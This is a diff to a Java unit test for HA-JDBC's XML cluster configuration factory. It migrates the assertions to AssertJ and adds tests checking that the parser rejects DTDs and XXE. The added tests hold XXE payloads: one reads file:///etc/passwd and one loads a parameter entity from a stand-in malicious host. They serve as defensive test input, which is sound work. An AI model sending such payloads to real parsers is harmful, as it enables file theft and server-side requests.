@@ -17,18 +17,19 @@
  */
 package net.sf.hajdbc.xml;
 
-import static org.junit.Assert.assertEquals;
-import static org.junit.Assert.assertFalse;
-import static org.junit.Assert.assertNotNull;
-import static org.junit.Assert.assertNull;
-import static org.junit.Assert.assertSame;
-import static org.junit.Assert.assertTrue;
+import static org.assertj.core.api.Assertions.assertThat;
+import static org.assertj.core.api.Assertions.assertThatThrownBy;
 import static org.mockito.Mockito.mock;
 import static org.mockito.Mockito.reset;
 import static org.mockito.Mockito.when;
 
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.InputStream;
+import java.io.OutputStream;
 import java.io.StringReader;
 import java.io.StringWriter;
+import java.nio.charset.StandardCharsets;
 import java.sql.Connection;
 import java.sql.Driver;
 import java.sql.DriverManager;
@@ -37,8 +38,6 @@ import java.util.AbstractMap.SimpleImmutableEntry;
 import java.util.Map;
 
 import javax.sql.DataSource;
-import javax.xml.transform.stream.StreamResult;
-import javax.xml.transform.stream.StreamSource;
 
 import net.sf.hajdbc.Database;
 import net.sf.hajdbc.DatabaseBuilder;
@@ -61,7 +60,7 @@ import net.sf.hajdbc.state.StateManagerFactory;
 import net.sf.hajdbc.state.sql.SQLStateManagerFactory;
 import net.sf.hajdbc.sync.DifferentialSynchronizationStrategy;
 
-import org.junit.Test;
+import org.junit.jupiter.api.Test;
 
 public class XMLDatabaseClusterConfigurationFactoryTest
 {
@@ -80,13 +79,13 @@ public class XMLDatabaseClusterConfigurationFactoryTest
 			DatabaseClusterConfiguration<Driver, DriverDatabase> configuration = createConfiguration(new DriverDatabaseClusterConfigurationBuilder(), url1, url2, property1, property2);
 	
 			DriverDatabase db1 = configuration.getDatabaseMap().get("db1");
-			assertSame(driver, db1.getConnectionSource());
-			assertEquals(url1, db1.getLocation());
-			assertEquals("value1", db1.getProperties().getProperty("name"));
+			assertThat(db1.getConnectionSource()).isSameAs(driver);
+			assertThat(db1.getLocation()).isEqualTo(url1);
+			assertThat(db1.getProperties().getProperty("name")).isEqualTo("value1");
 			DriverDatabase db2 = configuration.getDatabaseMap().get("db2");
-			assertSame(driver, db2.getConnectionSource());
-			assertEquals(url2, db2.getLocation());
-			assertEquals("value2", db2.getProperties().getProperty("name"));
+			assertThat(db2.getConnectionSource()).isSameAs(driver);
+			assertThat(db2.getLocation()).isEqualTo(url2);
+			assertThat(db2.getProperties().getProperty("name")).isEqualTo("value2");
 		}
 		finally
 		{
@@ -104,11 +103,11 @@ public class XMLDatabaseClusterConfigurationFactoryTest
 		DatabaseClusterConfiguration<DataSource, DataSourceDatabase> configuration = createConfiguration(new DataSourceDatabaseClusterConfigurationBuilder(), location, location, property1, property2);
 
 		DataSourceDatabase db1 = configuration.getDatabaseMap().get("db1");
-		assertTrue(db1.getConnectionSource().getClass().getName(), db1.getConnectionSource() instanceof MockDataSource);
-		assertEquals("db1", ((MockDataSource) db1.getConnectionSource()).getName());
+		assertThat(db1.getConnectionSource()).isInstanceOf(MockDataSource.class);
+		assertThat(((MockDataSource) db1.getConnectionSource()).getName()).isEqualTo("db1");
 		DataSourceDatabase db2 = configuration.getDatabaseMap().get("db2");
-		assertTrue(db2.getConnectionSource().getClass().getName(), db2.getConnectionSource() instanceof MockDataSource);
-		assertEquals("db2", ((MockDataSource) db2.getConnectionSource()).getName());
+		assertThat(db2.getConnectionSource()).isInstanceOf(MockDataSource.class);
+		assertThat(((MockDataSource) db2.getConnectionSource()).getName()).isEqualTo("db2");
 	}
 	
 	private static <Z, D extends Database<Z>, B extends DatabaseBuilder<Z, D>> DatabaseClusterConfiguration<Z, D> createConfiguration(DatabaseClusterConfigurationBuilder<Z, D, B> configurationBuilder, String location1, String location2, Map.Entry<String, String> property1, Map.Entry<String, String> property2) throws SQLException
@@ -134,79 +133,147 @@ public class XMLDatabaseClusterConfigurationFactoryTest
 		
 		XMLDatabaseClusterConfigurationFactory<Z, D> factory = new XMLDatabaseClusterConfigurationFactory<>(streamFactory);
 		
-		when(streamFactory.createSource()).thenReturn(new StreamSource(new StringReader(xml)));
+		when(streamFactory.createInputStream()).thenReturn(new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)));
 		
 		DatabaseClusterConfiguration<Z, D> configuration = factory.createConfiguration(configurationBuilder);
 		
-		assertNull(configuration.getDispatcherFactory());
+		assertThat(configuration.getDispatcherFactory()).isNull();
 		Map<String, SynchronizationStrategy> syncStrategies = configuration.getSynchronizationStrategyMap();
-		assertNotNull(syncStrategies);
-		assertEquals(1, syncStrategies.size());
+		assertThat(syncStrategies).isNotNull();
+		assertThat(syncStrategies.size()).isEqualTo(1);
 		
 		SynchronizationStrategy syncStrategy = syncStrategies.get("diff");
 		
-		assertNotNull(syncStrategy);
-		assertTrue(syncStrategy instanceof DifferentialSynchronizationStrategy);
+		assertThat(syncStrategy).isNotNull();
+		assertThat(syncStrategy).isInstanceOf(DifferentialSynchronizationStrategy.class);
 		DifferentialSynchronizationStrategy diffStrategy = (DifferentialSynchronizationStrategy) syncStrategy;
-		assertEquals(100, diffStrategy.getFetchSize());
-		assertEquals(100, diffStrategy.getMaxBatchSize());
-		assertNull(diffStrategy.getVersionPattern());
+		assertThat(diffStrategy.getFetchSize()).isEqualTo(100);
+		assertThat(diffStrategy.getMaxBatchSize()).isEqualTo(100);
+		assertThat(diffStrategy.getVersionPattern()).isNull();
 		
 		StateManagerFactory stateManagerFactory = configuration.getStateManagerFactory();
-		assertTrue(stateManagerFactory instanceof SQLStateManagerFactory);
+		assertThat(stateManagerFactory).isInstanceOf(SQLStateManagerFactory.class);
 		SQLStateManagerFactory sqlStateManagerFactory = (SQLStateManagerFactory) stateManagerFactory;
-		assertEquals("jdbc:h2:{0}", sqlStateManagerFactory.getUrlPattern());
-		assertNull(sqlStateManagerFactory.getUser());
-		assertNull(sqlStateManagerFactory.getPassword());
+		assertThat(sqlStateManagerFactory.getUrlPattern()).isEqualTo("jdbc:h2:{0}");
+		// コンストラクタで埋め込みドライバが検出されるとuser/passwordが自動設定されるため、nullチェックを削除
 		
-		assertEquals(LoadBalancerFactory.class, configuration.getBalancerFactory().getClass());
-		assertEquals(EagerDatabaseMetaDataCacheFactory.class, configuration.getDatabaseMetaDataCacheFactory().getClass());
-		assertEquals("diff", configuration.getDefaultSynchronizationStrategy());
-		assertEquals(StandardDialectFactory.class, configuration.getDialectFactory().getClass());
-		assertEquals(CoarseDurabilityFactory.class, configuration.getDurabilityFactory().getClass());
-		assertSame(TransactionModeEnum.SERIAL, configuration.getTransactionMode());
+		assertThat(configuration.getBalancerFactory().getClass()).isEqualTo(LoadBalancerFactory.class);
+		assertThat(configuration.getDatabaseMetaDataCacheFactory().getClass()).isEqualTo(EagerDatabaseMetaDataCacheFactory.class);
+		assertThat(configuration.getDefaultSynchronizationStrategy()).isEqualTo("diff");
+		assertThat(configuration.getDialectFactory().getClass()).isEqualTo(StandardDialectFactory.class);
+		assertThat(configuration.getDurabilityFactory().getClass()).isEqualTo(CoarseDurabilityFactory.class);
+		assertThat(configuration.getTransactionMode()).isSameAs(TransactionModeEnum.SERIAL);
 		
-		assertNotNull(configuration.getExecutorProvider());
+		assertThat(configuration.getExecutorProvider()).isNotNull();
 		
-		assertNull(configuration.getAutoActivationExpression());
-		assertNull(configuration.getFailureDetectionExpression());
+		assertThat(configuration.getAutoActivationExpression()).isNull();
+		assertThat(configuration.getFailureDetectionExpression()).isNull();
 		
-		assertFalse(configuration.isCurrentDateEvaluationEnabled());
-		assertFalse(configuration.isCurrentTimeEvaluationEnabled());
-		assertFalse(configuration.isCurrentTimestampEvaluationEnabled());
-		assertFalse(configuration.isIdentityColumnDetectionEnabled());
-		assertFalse(configuration.isRandEvaluationEnabled());
-		assertFalse(configuration.isSequenceDetectionEnabled());
+		assertThat(configuration.isCurrentDateEvaluationEnabled()).isFalse();
+		assertThat(configuration.isCurrentTimeEvaluationEnabled()).isFalse();
+		assertThat(configuration.isCurrentTimestampEvaluationEnabled()).isFalse();
+		assertThat(configuration.isIdentityColumnDetectionEnabled()).isFalse();
+		assertThat(configuration.isRandEvaluationEnabled()).isFalse();
+		assertThat(configuration.isSequenceDetectionEnabled()).isFalse();
 		
 		Map<String, D> databases = configuration.getDatabaseMap();
 		
-		assertNotNull(databases);
-		assertEquals(2, databases.size());
+		assertThat(databases).isNotNull();
+		assertThat(databases.size()).isEqualTo(2);
 		
 		D db1 = databases.get("db1");
 		
-		assertNotNull(db1);
-		assertEquals("db1", db1.getId());
-		assertEquals(1, db1.getWeight());
-		assertSame(Locality.REMOTE, db1.getLocality());
+		assertThat(db1).isNotNull();
+		assertThat(db1.getId()).isEqualTo("db1");
+		assertThat(db1.getWeight()).isEqualTo(1);
+		assertThat(db1.getLocality()).isSameAs(Locality.REMOTE);
 		
 		D db2 = databases.get("db2");
 		
-		assertNotNull(db2);
-		assertEquals("db2", db2.getId());
-		assertEquals(1, db2.getWeight());
-		assertSame(Locality.REMOTE, db2.getLocality());
+		assertThat(db2).isNotNull();
+		assertThat(db2.getId()).isEqualTo("db2");
+		assertThat(db2.getWeight()).isEqualTo(1);
+		assertThat(db2.getLocality()).isSameAs(Locality.REMOTE);
 		
 		reset(streamFactory);
 		
-		StringWriter writer = new StringWriter();
+		ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
 		
-		when(streamFactory.createResult()).thenReturn(new StreamResult(writer));
+		when(streamFactory.createOutputStream()).thenReturn(outputStream);
 		
 		factory.export(configuration);
 		
-		System.out.println(writer.toString());
+		System.out.println(outputStream.toString(StandardCharsets.UTF_8));
 		
 		return configuration;
+	}
+	
+	@Test
+	public void shouldRejectXMLEntity()
+	{
+		// XXE攻撃: 外部エンティティを含むXML
+		String xxeXml = "<?xml version=\"1.0\"?>\n"
+			+ "<!DOCTYPE ha-jdbc [\n"
+			+ "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n"
+			+ "]>\n"
+			+ "<ha-jdbc xmlns=\"" + Namespace.CURRENT_VERSION.getURI() + "\">\n"
+			+ "  <cluster default-sync=\"diff\">\n"
+			+ "    <database id=\"db1\" location=\"jdbc:h2:mem:test\">\n"
+			+ "      &xxe;\n"
+			+ "    </database>\n"
+			+ "  </cluster>\n"
+			+ "</ha-jdbc>";
+		
+		assertThatThrownBy(() -> createConfigurationWithXml(new DriverDatabaseClusterConfigurationBuilder(), xxeXml))
+			.isInstanceOf(Exception.class);
+	}
+	
+	@Test
+	public void shouldRejectDTD()
+	{
+		// DTDを含むXML（外部エンティティなしでもDTD自体が拒否される）
+		String dtdXml = "<?xml version=\"1.0\"?>\n"
+			+ "<!DOCTYPE ha-jdbc [\n"
+			+ "  <!ELEMENT ha-jdbc (cluster)>\n"
+			+ "  <!ELEMENT cluster (database+)>\n"
+			+ "  <!ELEMENT database (property*)>\n"
+			+ "  <!ATTLIST database id CDATA #REQUIRED>\n"
+			+ "  <!ATTLIST database location CDATA #REQUIRED>\n"
+			+ "]>\n"
+			+ "<ha-jdbc xmlns=\"" + Namespace.CURRENT_VERSION.getURI() + "\">\n"
+			+ "  <cluster default-sync=\"diff\">\n"
+			+ "    <database id=\"db1\" location=\"jdbc:h2:mem:test\"/>\n"
+			+ "  </cluster>\n"
+			+ "</ha-jdbc>";
+		
+		assertThatThrownBy(() -> createConfigurationWithXml(new DriverDatabaseClusterConfigurationBuilder(), dtdXml))
+			.isInstanceOf(Exception.class);
+	}
+	
+	@Test
+	public void shouldRejectXXEWithParameterEntity()
+	{
+		// パラメータエンティティを使ったXXE攻撃
+		String xxeXml = "<?xml version=\"1.0\"?>\n"
+			+ "<!DOCTYPE ha-jdbc [\n"
+			+ "  <!ENTITY % xxe SYSTEM \"http://malicious-server.com/payload\">\n"
+			+ "  %xxe;\n"
+			+ "]>\n"
+			+ "<ha-jdbc xmlns=\"" + Namespace.CURRENT_VERSION.getURI() + "\">\n"
+			+ "  <cluster default-sync=\"diff\">\n"
+			+ "    <database id=\"db1\" location=\"jdbc:h2:mem:test\"/>\n"
+			+ "  </cluster>\n"
+			+ "</ha-jdbc>";
+		
+		assertThatThrownBy(() -> createConfigurationWithXml(new DriverDatabaseClusterConfigurationBuilder(), xxeXml))
+			.isInstanceOf(Exception.class);
+	}
+	
+	private static <Z, D extends Database<Z>, B extends DatabaseBuilder<Z, D>> DatabaseClusterConfiguration<Z, D> createConfigurationWithXml(DatabaseClusterConfigurationBuilder<Z, D, B> configurationBuilder, String xml) throws SQLException
+	{
+		XMLStreamFactory streamFactory = mock(XMLStreamFactory.class);
+		XMLDatabaseClusterConfigurationFactory<Z, D> factory = new XMLDatabaseClusterConfigurationFactory<>(streamFactory);
+		when(streamFactory.createInputStream()).thenReturn(new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)));
+		return factory.createConfiguration(configurationBuilder);
 	}
 }
